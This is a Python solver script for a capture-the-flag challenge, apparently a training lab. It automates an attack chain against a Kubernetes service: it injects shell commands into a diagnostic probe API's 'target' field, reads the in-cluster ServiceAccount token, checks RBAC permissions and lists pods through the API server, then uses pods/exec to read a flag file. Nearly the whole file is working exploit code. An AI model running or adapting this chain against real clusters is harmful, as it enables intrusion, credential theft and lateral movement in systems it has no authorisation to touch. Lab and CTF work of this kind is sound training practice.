#!/usr/bin/env python3
"""
Automated Participant-Side Solver for 30-internal-kubernetes
Exploits command injection on the fleet sentinel diagnostic probe API on port 8090,
recovers the in-cluster ServiceAccount token, enumerates overbroad RBAC permissions,
and executes into the orbital defense controller pod to extract the flag.
"""

import sys
import re
import json
import argparse
import urllib.request
import urllib.error

def run_probe_command(base_url, command):
    endpoint = f"{base_url.rstrip('/')}/api/v1/diagnostics/probe"
    payload = {
        "probe_type": "ping",
        "target": f"127.0.0.1; {command}"
    }
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        endpoint,
        data=data,
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            res_json = json.loads(response.read().decode("utf-8"))
            return res_json.get("output", "")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="ignore")
        try:
            res_json = json.loads(body)
            return res_json.get("output", "")
        except Exception:
            return body
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return ""

def solve(base_url="http://127.0.0.1:8090"):
    base_url = base_url.rstrip("/")
    print("=" * 65)
    print(" [*] 30-internal-kubernetes Automated Solver")
    print(f" [*] Target Base URL: {base_url}")
    print("=" * 65)

    # Step 1: Verify Initial Command Injection Foothold
    print("\n[Step 1] Verifying diagnostic probe command injection...")
    id_out = run_probe_command(base_url, "id")
    if not id_out or "uid=" not in id_out:
        print(f"[-] Command injection failed. Output: {id_out}")
        sys.exit(1)
    print(f"[+] Initial foothold established:\n    {id_out.strip()}")

    # Step 2: Extract In-Cluster ServiceAccount Token
    print("\n[Step 2] Locating ServiceAccount token and namespace...")
    sa_cmd = "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace && echo '---' && cat /var/run/secrets/kubernetes.io/serviceaccount/token"
    sa_out = run_probe_command(base_url, sa_cmd)

    if "---" not in sa_out:
        print(f"[-] Failed to read service account credentials: {sa_out}")
        sys.exit(1)

    parts = sa_out.strip().split("---")
    namespace = parts[0].strip()
    token = parts[1].strip()

    print(f"[+] Discovered ServiceAccount Context:")
    print(f"    Namespace: {namespace}")
    print(f"    Token:     {token[:16]}...{token[-8:]}")

    # Step 3: Check RBAC in target namespace 'orbital-defense'
    print("\n[Step 3] Auditing RBAC permissions in namespace 'orbital-defense'...")
    rbac_cmd = f"curl -k -s -X POST https://127.0.0.1:6443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -H 'Authorization: Bearer {token}' -H 'Content-Type: application/json' -d '{{\"spec\": {{\"namespace\": \"orbital-defense\"}}}}'"
    rules_out = run_probe_command(base_url, rbac_cmd)

    try:
        rules_json = json.loads(rules_out)
        rules = rules_json.get("status", {}).get("resourceRules", [])
        has_exec = any("pods/exec" in r.get("resources", []) and "create" in r.get("verbs", []) for r in rules)
        if has_exec:
            print("[+] Verified: ServiceAccount has 'create' privilege on 'pods/exec' in 'orbital-defense'!")
    except Exception as e:
        print(f"[-] RBAC review output: {rules_out}")

    # Step 4: List Pods in 'orbital-defense'
    print("\n[Step 4] Enumerating pods in 'orbital-defense' namespace...")
    pods_cmd = f"curl -k -s https://127.0.0.1:6443/api/v1/namespaces/orbital-defense/pods -H 'Authorization: Bearer {token}'"
    pods_out = run_probe_command(base_url, pods_cmd)
    target_pod = "doombot-defense-controller-0"
    try:
        p_json = json.loads(pods_out)
        pod_names = [p["metadata"]["name"] for p in p_json.get("items", [])]
        print(f"[+] Pods in 'orbital-defense': {pod_names}")
        if pod_names:
            target_pod = pod_names[0]
    except Exception:
        print(f"[-] Pod query raw: {pods_out}")

    # Step 5: Execute Pod Exec to Capture Flag
    print(f"\n[Step 5] Triggering pod exec on '{target_pod}' to retrieve flag...")
    exec_cmd = f"curl -k -s -X POST 'https://127.0.0.1:6443/api/v1/namespaces/orbital-defense/pods/{target_pod}/exec?command=cat&command=/var/run/secrets/latveria.io/defense_flag.txt' -H 'Authorization: Bearer {token}'"
    flag_out = run_probe_command(base_url, exec_cmd)

    flag_match = re.search(r"(YUVA\{[^\}]+\}|DOOM\{[^\}]+\}|FLAG\{[^\}]+\})", flag_out)
    if not flag_match:
        print(f"[-] Flag pattern not found in output:\n{flag_out}")
        sys.exit(1)

    extracted_flag = flag_match.group(1)
    print("\n" + "=" * 65)
    print(f"[SUCCESS] Flag Retrieved: {extracted_flag}")
    print("=" * 65 + "\n")
    return extracted_flag

def main():
    parser = argparse.ArgumentParser(description="30-internal-kubernetes Solver")
    parser.add_argument("--url", default="http://127.0.0.1:8090", help="Target URL (default: http://127.0.0.1:8090)")
    args = parser.parse_args()
    solve(args.url)

if __name__ == "__main__":
    main()
